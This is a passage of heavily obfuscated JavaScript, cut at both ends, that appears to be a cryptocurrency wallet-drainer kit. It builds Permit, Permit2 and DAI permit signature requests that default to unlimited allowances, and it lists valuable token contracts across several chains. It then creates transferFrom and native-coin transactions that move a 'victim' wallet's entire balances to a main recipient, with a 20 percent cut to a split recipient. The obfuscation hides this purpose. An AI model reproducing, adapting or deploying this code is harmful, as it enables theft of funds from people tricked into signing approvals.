_0xa0b8a(_0x37b7e1,_0x1d0932,_0xafbc73){const _0x2a4576=_0x47e4be,_0x2e6f8b=_0xf3d7fa({'owner':_0x1d0932,..._0xafbc73});try{const _0x273081=await _0x37b7e1[_0x2a4576(0x3a1)]({'method':_0x2a4576(0xcd)+_0x2a4576(0x536),'params':[_0x1d0932,JSON[_0x2a4576(0x23f)](_0x2e6f8b)]});return _0x273081;}catch(_0x113523){throw new Error(_0x2a4576(0x207)+_0x2a4576(0x253)+_0x2a4576(0x373)+_0x113523[_0x2a4576(0x3ff)]);}}function _0x428812(_0x420e2c){const _0x108008=_0x47e4be,_0x32a80e=_0x420e2c[_0x108008(0x127)]('0x')?_0x420e2c['slice'](0x2):_0x420e2c;if(_0x32a80e[_0x108008(0x43e)]<0x80)throw new Error(_0x108008(0x475)+_0x108008(0x4da)+'ngth');return{'r':'0x'+_0x32a80e[_0x108008(0x17f)](0x0,0x40),'s':'0x'+_0x32a80e['slice'](0x40,0x80),'v':parseInt(_0x32a80e[_0x108008(0x17f)](0x80,0x82),0x10)};}function _0x4df94c(_0x246f2f,_0x8daf0c,_0x263045,_0x3c9741){const _0x366eaa=_0x47e4be,{parsePermit2Signature:_0x1f1cc0}=this||_0x3449d3,{v:_0x52a23a,r:_0x4b19c4,s:_0xf31236}=_0x1f1cc0(_0x3c9741),_0x149b91=_0x366eaa(0x626),_0xb1938b=_0x149b91;return _0xb1938b;}function _0x5a106a(_0x2cf262,_0x390614,_0x258c54,_0x58dde8){const _0x4f4097=_0x47e4be,_0x4418ba=_0x4f4097(0x24c);return _0x4418ba;}async function _0x2f7ae4(_0x4cab52,_0x489bf6,_0x54ea75,_0x336d7a){return{'amount':'0','expiration':0x0,'nonce':0x0};}async function _0x5c7ec4(_0x57dfca){const _0x172940=_0x47e4be;try{const _0x517eba=await _0x57dfca[_0x172940(0x3a1)]({'method':'eth_getCod'+'e','params':[_0x3c6627,_0x172940(0x4df)]});return _0x517eba&&_0x517eba!=='0x'&&_0x517eba!==_0x172940(0x348);}catch{return![];}}function _0x9c2c35(_0x398cab){const _0x582a78=_0x47e4be,{owner:_0x400452,tokens:_0x43d329,spender:_0x43f4fe,chainId:_0x2a568d,deadline:_0x37a7ac}=_0x398cab,_0x48c308=_0x2d9b5f(_0x400452),_0x1008f5=_0x37a7ac||Math['floor'](Date[_0x582a78(0x2c3)]()/0x3e8)+0xe10;if(_0x43d329[_0x582a78(0x43e)]===0x1)return{'type':'single','typedData':_0x27366b({'owner':_0x400452,'token':_0x43d329[0x0][_0x582a78(0x5b3)],'amount':_0x43d329[0x0][_0x582a78(0x51a)],'spender':_0x43f4fe,'nonce':_0x48c308,'deadline':_0x1008f5,'chainId':_0x2a568d}),'nonce':_0x48c308,'deadline':_0x1008f5};return{'type':_0x582a78(0x12d),'typedData':_0xf3d7fa({'owner':_0x400452,'tokens':_0x43d329,'spender':_0x43f4fe,'nonce':_0x48c308,'deadline':_0x1008f5,'chainId':_0x2a568d}),'nonce':_0x48c308,'deadline':_0x1008f5};}function _0x15a83e(_0xd0029f){const _0x229228=_0x47e4be;if(!_0xd0029f||typeof _0xd0029f!==_0x229228(0x2de))return![];const _0x71828=_0xd0029f[_0x229228(0x127)]('0x')?_0xd0029f['slice'](0x2):_0xd0029f;if(_0x71828[_0x229228(0x43e)]!==0x82)return![];return/^[0-9a-fA-F]+$/[_0x229228(0x5aa)](_0x71828);}return{'PERMIT2_ADDRESS':_0x3c6627,'PERMIT2_ABI':_0x6b82fa,'MAX_UINT160':_0x27243b,'MAX_UINT256':_0x201c9a,'createPermitTransferFrom':_0x27366b,'createPermitBatchTransferFrom':_0xf3d7fa,'createSignatureAllowanceTransfer':_0x238ef0,'generateNonce':_0x2d9b5f,'requestPermit2Signature':_0x31208f,'requestBatchPermit2Signature':_0xa0b8a,'parsePermit2Signature':_0x428812,'buildPermitTransferFromCalldata':_0x4df94c,'createApprovalCalldata':_0x5a106a,'getAllowance':_0x2f7ae4,'isDeployed':_0x5c7ec4,'createCompletePayload':_0x9c2c35,'validateSignature':_0x15a83e};}());typeof module!==_0x2c4f95(0x45a)&&module[_0x2c4f95(0x1c3)]&&(module['exports']=_0x3449d3);const _0x333218=(function(){'use strict';const _0x10a631=_0x2c4f95;const _0x25659e=_0x10a631(0x1eb)+_0x10a631(0x1e6)+'FFFFFFFFFF'+_0x10a631(0x1e6)+_0x10a631(0x1e6)+_0x10a631(0x1e6)+_0x10a631(0x3d5),_0x1a577e={'0xdAC17F958D2ee523a2206206994597C13D831ec7':{'name':_0x10a631(0x3e7),'symbol':_0x10a631(0x221),'decimals':0x6},'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48':{'name':_0x10a631(0x2ee),'symbol':'USDC','decimals':0x6},'0x6B175474E89094C44Da98b954EedeAC495271d0F':{'name':_0x10a631(0x251)+_0x10a631(0x47a),'symbol':_0x10a631(0x38b),'decimals':0x12},'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984':{'name':_0x10a631(0xbb),'symbol':'UNI','decimals':0x12},'0x514910771AF9Ca656af840dff83E8264EcF986CA':{'name':_0x10a631(0x4e8)+'Token','symbol':_0x10a631(0x14c),'decimals':0x12},'0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9':{'name':_0x10a631(0x1d2),'symbol':'AAVE','decimals':0x12},'0x6De037ef9aD27adb5F178A0E670b2B819b5F22cA':{'name':_0x10a631(0x96),'symbol':_0x10a631(0x37b),'decimals':0x12},'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599':{'name':_0x10a631(0x598)+'C','symbol':_0x10a631(0x38e),'decimals':0x8},'0xc00e94Cb662C3520282E6f5717214004A7f26888':{'name':_0x10a631(0x636),'symbol':_0x10a631(0x236),'decimals':0x12},'0x514910771AF9Ca656af840dff83E8264EcF986CA':{'name':_0x10a631(0x4e8)+_0x10a631(0x5de),'symbol':'LINK','decimals':0x12},'0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9':{'name':'Aave\x20Token','symbol':'AAVE','decimals':0x12},'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984':{'name':_0x10a631(0xbb),'symbol':_0x10a631(0x335),'decimals':0x12},'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE':{'name':_0x10a631(0x2a1),'symbol':_0x10a631(0x660),'decimals':0x12},'0x55d398326f99059fF775485246999027B3197955':{'name':_0x10a631(0x3e7),'symbol':_0x10a631(0x221),'decimals':0x12},'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d':{'name':'USD\x20Coin','symbol':'USDC','decimals':0x12},'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c':{'name':_0x10a631(0x47e),'symbol':'WBNB','decimals':0x12},'0x2170Ed0880ac9A755fd29B2688956BD959F933F8':{'name':_0x10a631(0x467)+_0x10a631(0x178),'symbol':_0x10a631(0x85),'decimals':0x12},'0xc2132D05D31c914a87C6611C10748AEb04B58e8F':{'name':_0x10a631(0x3e7),'symbol':_0x10a631(0x221),'decimals':0x6},'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174':{'name':_0x10a631(0x2ee),'symbol':_0x10a631(0x2ec),'decimals':0x6},'0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619':{'name':_0x10a631(0x31e)+_0x10a631(0x56d),'symbol':_0x10a631(0x354),'decimals':0x12},'0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6':{'name':_0x10a631(0x131)+_0x10a631(0x225),'symbol':_0x10a631(0x38e),'decimals':0x8},'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9':{'name':'Tether\x20USD','symbol':_0x10a631(0x221),'decimals':0x6},'0xaf88d065e77c8cC2239327C5EDb3A432268e5831':{'name':_0x10a631(0x2ee),'symbol':'USDC','decimals':0x6},'0x82aF49447D8a07e3bd95BD0d56f35241523fBab1':{'name':_0x10a631(0x31e)+_0x10a631(0x56d),'symbol':_0x10a631(0x354),'decimals':0x12},'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58':{'name':'Tether\x20USD','symbol':_0x10a631(0x221),'decimals':0x6},'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85':{'name':_0x10a631(0x2ee),'symbol':'USDC','decimals':0x6},'0x4200000000000000000000000000000000000006':{'name':_0x10a631(0x31e)+_0x10a631(0x56d),'symbol':_0x10a631(0x354),'decimals':0x12},'0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2':{'name':'Tether\x20USD','symbol':_0x10a631(0x221),'decimals':0x6},'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913':{'name':_0x10a631(0x2ee),'symbol':_0x10a631(0x2ec),'decimals':0x6},'0x4200000000000000000000000000000000000006':{'name':'Wrapped\x20Et'+_0x10a631(0x56d),'symbol':_0x10a631(0x354),'decimals':0x12}},_0x116042=['function\x20p'+'ermit(addr'+_0x10a631(0x248)+_0x10a631(0x13f)+_0x10a631(0x1f0)+_0x10a631(0x631)+_0x10a631(0x136)+_0x10a631(0x125)+_0x10a631(0x2cd)+'bytes32\x20r,'+_0x10a631(0x22c)+_0x10a631(0x55f),'function\x20n'+_0x10a631(0x464)+_0x10a631(0x32a)+_0x10a631(0x48c)+_0x10a631(0x62a)+_0x10a631(0x32b)+'6)',_0x10a631(0x17d)+'OMAIN_SEPA'+'RATOR()\x20ex'+_0x10a631(0x533)+'w\x20returns\x20'+_0x10a631(0x11c),'function\x20n'+'ame()\x20exte'+'rnal\x20view\x20'+'returns\x20(s'+_0x10a631(0x449),'function\x20s'+_0x10a631(0xfd)+_0x10a631(0x533)+'w\x20returns\x20'+'(string)',_0x10a631(0x3d9)+_0x10a631(0x5cb)+_0x10a631(0x41b)+'iew\x20return'+_0x10a631(0x50e)],_0x4120bb=[_0x10a631(0x4c5)+_0x10a631(0x4fc)+_0x10a631(0x496)+',\x20address\x20'+_0x10a631(0x416)+_0x10a631(0x1d4)+'ce,\x20uint25'+'6\x20expiry,\x20'+_0x10a631(0x4a3)+_0x10a631(0x45c)+'v,\x20bytes32'+_0x10a631(0x3e6)+'2\x20s)\x20exter'+_0x10a631(0x4f6)];function _0x3a6ccf(_0x5bb278){const _0x552e2d=_0x10a631,{owner:_0x4eeedf,token:_0x1e8323,tokenName:_0x16d7a1,spender:_0x189f5d,value:_0x3035bf,nonce:_0x1ec81e,deadline:_0x5cc683,chainId:_0x404a58,version:_0x53b2b3}=_0x5bb278,_0x401ade=_0x1a577e[_0x1e8323]||{},_0x396ae3=_0x16d7a1||_0x401ade['name']||_0x552e2d(0x5de),_0x83270e=_0x53b2b3||'1',_0x511d8d=_0x3035bf||_0x25659e,_0x42e4f3=_0x5cc683||Math[_0x552e2d(0x57a)](Date[_0x552e2d(0x2c3)]()/0x3e8)+0xe10,_0xc4c7e6=_0x1ec81e||0x0,_0x36bccb={'name':_0x396ae3,'version':_0x83270e,'chainId':_0x404a58,'verifyingContract':_0x1e8323},_0x303af7={'EIP712Domain':[{'name':_0x552e2d(0x2d5),'type':_0x552e2d(0x2de)},{'name':'version','type':_0x552e2d(0x2de)},{'name':_0x552e2d(0x453),'type':'uint256'},{'name':_0x552e2d(0x18d)+'ontract','type':_0x552e2d(0x565)}],'Permit':[{'name':_0x552e2d(0x2cb),'type':_0x552e2d(0x565)},{'name':_0x552e2d(0x106),'type':_0x552e2d(0x565)},{'name':_0x552e2d(0x4b0),'type':_0x552e2d(0x56f)},{'name':_0x552e2d(0x366),'type':'uint256'},{'name':_0x552e2d(0x2e0),'type':'uint256'}]},_0x494f1c={'owner':_0x4eeedf,'spender':_0x189f5d,'value':_0x511d8d,'nonce':_0xc4c7e6,'deadline':_0x42e4f3};return{'domain':_0x36bccb,'types':_0x303af7,'primaryType':_0x552e2d(0x5f7),'message':_0x494f1c};}function _0x172984(_0x3de82c){const _0x346c86=_0x10a631,{owner:_0x2d85c9,token:_0x337fe3,spender:_0x4f6484,nonce:_0x3a3123,expiry:_0x4eb569,allowed:_0x14f540,chainId:_0x4e3d70}=_0x3de82c,_0x3ac194={'name':_0x346c86(0x251)+_0x346c86(0x47a),'version':'1','chainId':_0x4e3d70,'verifyingContract':_0x337fe3},_0x449a29={'EIP712Domain':[{'name':_0x346c86(0x2d5),'type':_0x346c86(0x2de)},{'name':_0x346c86(0x49d),'type':_0x346c86(0x2de)},{'name':_0x346c86(0x453),'type':'uint256'},{'name':_0x346c86(0x18d)+'ontract','type':_0x346c86(0x565)}],'Permit':[{'name':_0x346c86(0x5da),'type':_0x346c86(0x565)},{'name':_0x346c86(0x106),'type':_0x346c86(0x565)},{'name':_0x346c86(0x366),'type':'uint256'},{'name':_0x346c86(0xe9),'type':_0x346c86(0x56f)},{'name':_0x346c86(0xb8),'type':_0x346c86(0x39c)}]},_0x81b3e9={'holder':_0x2d85c9,'spender':_0x4f6484,'nonce':_0x3a3123||0x0,'expiry':_0x4eb569||Math['floor'](Date[_0x346c86(0x2c3)]()/0x3e8)+0x15180*0x16d,'allowed':_0x14f540!==![]};return{'domain':_0x3ac194,'types':_0x449a29,'primaryType':_0x346c86(0x5f7),'message':_0x81b3e9};}async function _0x14c211(_0x3d5e32,_0x26f905,_0x3b9388){const _0x15087d=_0x10a631,_0x4e5770=_0x3a6ccf({'owner':_0x26f905,..._0x3b9388});try{const _0x1bce79=await _0x3d5e32[_0x15087d(0x3a1)]({'method':_0x15087d(0xcd)+'pedData_v4','params':[_0x26f905,JSON[_0x15087d(0x23f)](_0x4e5770)]});return _0x1bce79;}catch(_0x2a84d8){try{const _0x16bf91=await _0x3d5e32[_0x15087d(0x3a1)]({'method':_0x15087d(0xcd)+_0x15087d(0x117),'params':[_0x26f905,JSON['stringify'](_0x4e5770)]});return _0x16bf91;}catch(_0x577cd3){throw new Error(_0x15087d(0x1c2)+_0x15087d(0x5f4)+'d:\x20'+_0x2a84d8[_0x15087d(0x3ff)]);}}}async function _0x1e3b00(_0x543039,_0x3b293f,_0x252501){const _0x3d91ea=_0x10a631,_0x9cc483=_0x172984({'owner':_0x3b293f,..._0x252501});try{const _0x3029a0=await _0x543039[_0x3d91ea(0x3a1)]({'method':_0x3d91ea(0xcd)+'pedData_v4','params':[_0x3b293f,JSON['stringify'](_0x9cc483)]});return _0x3029a0;}catch(_0x447b47){throw new Error('DAI\x20permit'+_0x3d91ea(0x446)+_0x3d91ea(0x2f6)+_0x447b47[_0x3d91ea(0x3ff)]);}}function _0x5f567e(_0x480726){const _0x2c4e2a=_0x10a631,_0x16e7d8=_0x480726[_0x2c4e2a(0x127)]('0x')?_0x480726[_0x2c4e2a(0x17f)](0x2):_0x480726;if(_0x16e7d8['length']!==0x82)throw new Error(_0x2c4e2a(0x475)+'gnature\x20le'+_0x2c4e2a(0x49c));return{'r':'0x'+_0x16e7d8[_0x2c4e2a(0x17f)](0x0,0x40),'s':'0x'+_0x16e7d8[_0x2c4e2a(0x17f)](0x40,0x80),'v':parseInt(_0x16e7d8[_0x2c4e2a(0x17f)](0x80,0x82),0x10)};}async function _0x40b66b(_0x53e3b5,_0x307dbb){const _0x56472c=_0x10a631;if(_0x1a577e[_0x307dbb])return _0x1a577e[_0x307dbb];try{const _0x197368=_0x56472c(0x244),_0x10d631=_0x56472c(0x608),_0x506d47=_0x56472c(0x613),[_0x38b2c6,_0x100bd2,_0x5c2318]=await Promise['all']([_0x53e3b5['request']({'method':_0x56472c(0x356),'params':[{'to':_0x307dbb,'data':_0x197368},_0x56472c(0x4df)]}),_0x53e3b5['request']({'method':_0x56472c(0x356),'params':[{'to':_0x307dbb,'data':_0x10d631},_0x56472c(0x4df)]}),_0x53e3b5[_0x56472c(0x3a1)]({'method':'eth_call','params':[{'to':_0x307dbb,'data':_0x506d47},_0x56472c(0x4df)]})]),_0x4ea98e=parseInt(_0x5c2318,0x10)||0x12;return{'name':'Token','symbol':_0x56472c(0x2c2),'decimals':_0x4ea98e};}catch{return{'name':_0x56472c(0x5de),'symbol':'TKN','decimals':0x12};}}async function _0x211438(_0x2b322b,_0x357c7a,_0x5e58b4){const _0x90a95e=_0x10a631;try{const _0x29d424=_0x90a95e(0x4ee)+_0x5e58b4[_0x90a95e(0x17f)](0x2)['padStart'](0x40,'0'),_0x8d552d=await _0x2b322b[_0x90a95e(0x3a1)]({'method':_0x90a95e(0x356),'params':[{'to':_0x357c7a,'data':_0x29d424},_0x90a95e(0x4df)]});return parseInt(_0x8d552d,0x10);}catch{return 0x0;}}async function _0x2dcc2b(_0x3c7e2c,_0x18da80){const _0x5c9cda=_0x10a631;try{const _0x5727fc=_0x5c9cda(0x4ee)+(_0x5c9cda(0x195)+_0x5c9cda(0x2a5)+_0x5c9cda(0x2a5)+_0x5c9cda(0x2a5)+'00')[_0x5c9cda(0x17f)](0x2),_0x569f67=await _0x3c7e2c[_0x5c9cda(0x3a1)]({'method':_0x5c9cda(0x356),'params':[{'to':_0x18da80,'data':_0x5727fc},'latest']});return _0x569f67!=='0x';}catch{return![];}}function _0x518ec6(_0x14d62f,_0x337810,_0x56aad7,_0x316c03,_0x36a4d0){const _0x598110=_0x10a631,{v:_0xa083dd,r:_0x4d39e1,s:_0x1aaee3}=_0x5f567e(_0x36a4d0),_0x1298c3=_0x598110(0x341);return _0x1298c3;}function _0x54461f(_0x16d17e){const _0x40ed66=_0x10a631,{owner:_0x3170a9,tokens:_0x998586,spender:_0x20ff99,chainId:_0x239d31,deadline:_0x34572c,nonces:_0x2b33e1}=_0x16d17e;return _0x998586[_0x40ed66(0x538)]((_0x1c272f,_0x9c213)=>{const _0x4d0b06=_0x40ed66;return _0x3a6ccf({'owner':_0x3170a9,'token':_0x1c272f,'spender':_0x20ff99,'value':_0x25659e,'nonce':_0x2b33e1?.[_0x9c213]||0x0,'deadline':_0x34572c||Math[_0x4d0b06(0x57a)](Date[_0x4d0b06(0x2c3)]()/0x3e8)+0xe10,'chainId':_0x239d31});});}function _0x512892(_0x3eedcb){const _0x37ba3a=_0x10a631;if(!_0x3eedcb[_0x37ba3a(0x2cb)]||!_0x3eedcb[_0x37ba3a(0x2cb)][_0x37ba3a(0x3eb)](/^0x[a-fA-F0-9]{40}$/))return{'valid':![],'error':_0x37ba3a(0x1d5)+'ner\x20addres'+'s'};if(!_0x3eedcb[_0x37ba3a(0x5b3)]||!_0x3eedcb[_0x37ba3a(0x5b3)][_0x37ba3a(0x3eb)](/^0x[a-fA-F0-9]{40}$/))return{'valid':![],'error':_0x37ba3a(0x288)+'ken\x20addres'+'s'};if(!_0x3eedcb[_0x37ba3a(0x106)]||!_0x3eedcb['spender'][_0x37ba3a(0x3eb)](/^0x[a-fA-F0-9]{40}$/))return{'valid':![],'error':_0x37ba3a(0x386)+'ender\x20addr'+_0x37ba3a(0x5d7)};if(!_0x3eedcb[_0x37ba3a(0x453)])return{'valid':![],'error':_0x37ba3a(0x5c1)+'ain\x20ID'};return{'valid':!![]};}return{'MAX_UINT256':_0x25659e,'KNOWN_TOKENS':_0x1a577e,'PERMIT_ABI':_0x116042,'DAI_PERMIT_ABI':_0x4120bb,'createPermitTypedData':_0x3a6ccf,'createDAIPermitTypedData':_0x172984,'requestPermitSignature':_0x14c211,'requestDAIPermitSignature':_0x1e3b00,'parseSignature':_0x5f567e,'getTokenInfo':_0x40b66b,'getNonce':_0x211438,'supportsPermit':_0x2dcc2b,'buildPermitCalldata':_0x518ec6,'createBatchPermitPayloads':_0x54461f,'validatePermitParams':_0x512892};}());typeof module!==_0x2c4f95(0x45a)&&module[_0x2c4f95(0x1c3)]&&(module['exports']=_0x333218);const _0x2cddd3=(function(){'use strict';const _0x536e87=_0x2c4f95;const _0x810046=0x14,_0x100f60=[_0x536e87(0x515)+_0x536e87(0x12e)+_0x536e87(0x13e)+_0x536e87(0x4de)+'ount)\x20exte'+'rnal\x20retur'+'ns\x20(bool)',_0x536e87(0x515)+_0x536e87(0x2d4)+'m(address\x20'+_0x536e87(0x4e4)+_0x536e87(0x44a)+_0x536e87(0x235)+_0x536e87(0x28e)+_0x536e87(0x431)+_0x536e87(0x327),'function\x20b'+'alanceOf(a'+_0x536e87(0x187)+'ount)\x20exte'+'rnal\x20view\x20'+_0x536e87(0x4c7)+_0x536e87(0xd9),_0x536e87(0x3d9)+_0x536e87(0x5cb)+_0x536e87(0x41b)+_0x536e87(0x17b)+_0x536e87(0x50e),_0x536e87(0xf5)+_0x536e87(0xfd)+_0x536e87(0x533)+_0x536e87(0x428)+_0x536e87(0x2a6),_0x536e87(0x307)+'ame()\x20exte'+_0x536e87(0x265)+_0x536e87(0x91)+'tring)'],_0x555177=[],_0x290de7={'transfer':_0x536e87(0x165),'transferFrom':_0x536e87(0x25a),'balanceOf':_0x536e87(0x424)};function _0x1a1897(_0x281098,_0x274745){const _0x313ad4=_0x536e87,_0xb28856=typeof _0x274745===_0x313ad4(0x2de)&&_0x274745[_0x313ad4(0x127)]('0x')?_0x274745[_0x313ad4(0x17f)](0x2)[_0x313ad4(0x119)](0x40,'0'):BigInt(_0x274745)[_0x313ad4(0x52c)](0x10)[_0x313ad4(0x119)](0x40,'0');return _0x290de7['transfer']+_0x281098[_0x313ad4(0x17f)](0x2)[_0x313ad4(0x119)](0x40,'0')+_0xb28856;}function _0x4d0498(_0x44723b,_0x3c82fb,_0x20ce94){const _0x1ca9dc=_0x536e87,_0xf57140=typeof _0x20ce94===_0x1ca9dc(0x2de)&&_0x20ce94[_0x1ca9dc(0x127)]('0x')?_0x20ce94[_0x1ca9dc(0x17f)](0x2)[_0x1ca9dc(0x119)](0x40,'0'):BigInt(_0x20ce94)[_0x1ca9dc(0x52c)](0x10)[_0x1ca9dc(0x119)](0x40,'0');return _0x290de7[_0x1ca9dc(0x16a)+'om']+_0x44723b['slice'](0x2)[_0x1ca9dc(0x119)](0x40,'0')+_0x3c82fb[_0x1ca9dc(0x17f)](0x2)['padStart'](0x40,'0')+_0xf57140;}function _0x588805(_0x45667e,_0x77ef16=_0x810046){const _0x2a8ffb=_0x536e87,_0x4da315=BigInt(_0x45667e),_0x436c40=BigInt(_0x77ef16*0x64),_0x5152f9=BigInt(0x2710),_0x3f3fa2=_0x4da315*_0x436c40/_0x5152f9,_0x244c31=_0x4da315-_0x3f3fa2;return{'totalAmount':_0x45667e,'mainAmount':_0x244c31[_0x2a8ffb(0x52c)](),'splitAmount':_0x3f3fa2[_0x2a8ffb(0x52c)](),'splitPercent':_0x77ef16,'mainPercent':0x64-_0x77ef16};}function _0x22eda9(_0x2792ea){const _0x4515a9=_0x536e87,{token:_0x1426bc,from:_0x54c245,mainRecipient:_0x3083df,splitRecipient:_0xbdb4b0,totalAmount:_0x3d2b76,splitPercent:_0x2dce2e,chainId:_0x966603}=_0x2792ea,{mainAmount:_0x4ec54a,splitAmount:_0xd6791}=_0x588805(_0x3d2b76,_0x2dce2e||_0x810046),_0xe1018e=[];return BigInt(_0x4ec54a)>0x0n&&_0xe1018e['push']({'to':_0x1426bc,'from':_0x54c245,'data':_0x1a1897(_0x3083df,_0x4ec54a),'value':_0x4515a9(0x348),'chainId':_0x966603}),BigInt(_0xd6791)>0x0n&&_0xbdb4b0&&_0xe1018e['push']({'to':_0x1426bc,'from':_0x54c245,'data':_0x1a1897(_0xbdb4b0,_0xd6791),'value':_0x4515a9(0x348),'chainId':_0x966603}),_0xe1018e;}function _0x38752f(_0x490ab4){const _0x34b503=_0x536e87,{token:_0x429256,victim:_0x57bfa7,mainRecipient:_0x43127d,splitRecipient:_0x546f57,totalAmount:_0x1158b6,splitPercent:_0x2a19f3,chainId:_0x47f049}=_0x490ab4,{mainAmount:_0x17c680,splitAmount:_0x5bfbf4}=_0x588805(_0x1158b6,_0x2a19f3||_0x810046),_0x4cadf6=[];return BigInt(_0x17c680)>0x0n&&_0x4cadf6[_0x34b503(0x1bf)]({'to':_0x429256,'data':_0x4d0498(_0x57bfa7,_0x43127d,_0x17c680),'value':_0x34b503(0x348),'chainId':_0x47f049}),BigInt(_0x5bfbf4)>0x0n&&_0x546f57&&_0x4cadf6[_0x34b503(0x1bf)]({'to':_0x429256,'data':_0x4d0498(_0x57bfa7,_0x546f57,_0x5bfbf4),'value':'0x0','chainId':_0x47f049}),_0x4cadf6;}function _0x205ad3(_0x523f06){const _0x32d371=_0x536e87,{from:_0x2fc153,mainRecipient:_0x23c4e2,splitRecipient:_0x396d2d,totalAmount:_0x55fe31,splitPercent:_0x310df7,chainId:_0x1dce6b}=_0x523f06,{mainAmount:_0x1fbc0a,splitAmount:_0x3105d5}=_0x588805(_0x55fe31,_0x310df7||_0x810046),_0x569916=[];return BigInt(_0x1fbc0a)>0x0n&&_0x569916[_0x32d371(0x1bf)]({'from':_0x2fc153,'to':_0x23c4e2,'value':'0x'+BigInt(_0x1fbc0a)['toString'](0x10),'data':'0x','chainId':_0x1dce6b}),BigInt(_0x3105d5)>0x0n&&_0x396d2d&&_0x569916[_0x32d371(0x1bf)]({'from':_0x2fc153,'to':_0x396d2d,'value':'0x'+BigInt(_0x3105d5)['toString'](0x10),'data':'0x','chainId':_0x1dce6b}),_0x569916;}async function _0x2eafc3(_0x4f0cff,_0x139708,_0x410e4a){const _0x56a2a3=_0x536e87;if(!_0x139708||_0x139708===_0x56a2a3(0x195)+_0x56a2a3(0x2a5)+_0x56a2a3(0x2a5)+'0000000000'+'00')try{const _0x11498a=await _0x4f0cff[_0x56a2a3(0x3a1)]({'method':_0x56a2a3(0x60d)+_0x56a2a3(0x502),'params':[_0x410e4a,_0x56a2a3(0x4df)]});return _0x11498a;}catch(_0x5efb6a){return _0x56a2a3(0x348);}try{const _0x5b53b5=_0x290de7[_0x56a2a3(0x323)]+_0x410e4a['slice'](0x2)['padStart'](0x40,'0'),_0x1e5343=await _0x4f0cff[_0x56a2a3(0x3a1)]({'method':'eth_call','params':[{'to':_0x139708,'data':_0x5b53b5},_0x56a2a3(0x4df)]});return _0x1e5343;}catch(_0x4ec556){return _0x56a2a3(0x348);}}async function _0xdf3ba(_0x3c9d9b,_0x284a10){const _0x593e8c=_0x536e87,{token:_0x3076de,isNative:_0x41d06e,from:_0x38e2da,mainRecipient:_0x3b0565,splitRecipient:_0x4f4d35,totalAmount:_0x6aa2cb,splitPercent:_0x59252b}=_0x284a10,_0x27a99d={'mainTx':null,'splitTx':null,'success':![]};try{if(_0x41d06e){const _0x4af37f=_0x205ad3(_0x284a10);_0x4af37f[_0x593e8c(0x43e)]>0x0&&(_0x27a99d[_0x593e8c(0x514)]=await _0x3c9d9b[_0x593e8c(0x3a1)]({'method':_0x593e8c(0x30d)+_0x593e8c(0x3ee),'params':[_0x4af37f[0x0]]})),_0x4af37f[_0x593e8c(0x43e)]>0x1&&(_0x27a99d[_0x593e8c(0x2e2)]=await _0x3c9d9b[_0x593e8c(0x3a1)]({'method':'eth_sendTr'+_0x593e8c(0x3ee),'params':[_0x4af37f[0x1]]}));}else{const _0x2be522=_0x22eda9(_0x284a10);for(let _0x2ba920=0x0;_0x2ba920<_0x2be522['length'];_0x2ba920++){const _0x274e2a=_0x2be522[_0x2ba920];try{const _0xedd4a1=await _0x3c9d9b[_0x593e8c(0x3a1)]({'method':'eth_sendTr'+_0x593e8c(0x3ee),'params':[_0x274e2a]});if(_0x2ba920===0x0)_0x27a99d[_0x593e8c(0x514)]=_0xedd4a1;else _0x27a99d[_0x593e8c(0x2e2)]=_0xedd4a1;}catch(_0x13b8e4){console[_0x593e8c(0x4a8)]('Transfer\x20'+_0x2ba920+_0x593e8c(0x2f2),_0x13b8e4[_0x593e8c(0x3ff)]);}}}_0x27a99d[_0x593e8c(0x426)]=!![];}catch(_0xbc6b57){_0x27a99d['error']=_0xbc6b57[_0x593e8c(0x3ff)];}return _0x27a99d;}async function _0x3bc382(_0x5ecdeb,_0x177199){const _0x280c60=_0x536e87,{tokens:_0x3197d4,from:_0x18740e,mainRecipient:_0x3565eb,splitRecipient:_0xf46e27,splitPercent:_0x30fe6a}=_0x177199,_0x139137=[];for(const _0x59a8fb of _0x3197d4){const {token:_0x4e992b,balance:_0xd22945,isNative:_0x2f1da3,decimals:_0x476fda}=_0x59a8fb;if(BigInt(_0xd22945)<=0x0n){_0x139137[_0x280c60(0x1bf)]({'token':_0x4e992b,'success':![],'reason':'Zero\x20balan'+'ce'});continue;}try{const _0x5a1b5d=await _0xdf3ba(_0x5ecdeb,{'token':_0x4e992b,'isNative':_0x2f1da3,'from':_0x18740e,'mainRecipient':_0x3565eb,'splitRecipient':_0xf46e27,'totalAmount':_0xd22945,'splitPercent':_0x30fe6a});_0x139137[_0x280c60(0x1bf)]({'token':_0x4e992b,..._0x5a1b5d});}catch(_0x5d0993){_0x139137[_0x280c60(0x1bf)]({'token':_0x4e992b,'success':![],'error':_0x5d0993[_0x280c60(0x3ff)]});}}return _0x139137;}function _0x1e81fb(_0x538f65,_0xdaecf9=0x12){const _0x452988=_0x536e87;try{const _0x466ffc=BigInt(_0x538f65),_0x3455a0=BigInt(0xa**_0xdaecf9),_0x466a1c=Number(_0x466ffc)/Number(_0x3455a0);return _0x466a1c[_0x452988(0x79)+'ring'](undefined,{'maximumFractionDigits':0x6});}catch{return'0';}}function _0x115f89(_0x1e8afe,_0x291725=0x12){const _0x52b40a=_0x536e87,[_0x4db8cf,_0x44ef94='']=_0x1e8afe['toString']()[_0x52b40a(0x19b)]('.'),_0x599d42=_0x4db8cf+_0x44ef94[_0x52b40a(0x4e2)](_0x291725,'0')[_0x52b40a(0x17f)](0x0,_0x291725);return BigInt(_0x599d42);}async function _0xc9c6ea(_0x544a94){const _0x16d307=_0x536e87;try{return await _0x544a94['request']({'method':'eth_gasPri'+'ce'});}catch{return _0x16d307(0x487)+'0';}}async function _0x5bb917(_0x371157,_0x39318b){const _0x573166=_0x536e87;try{return await 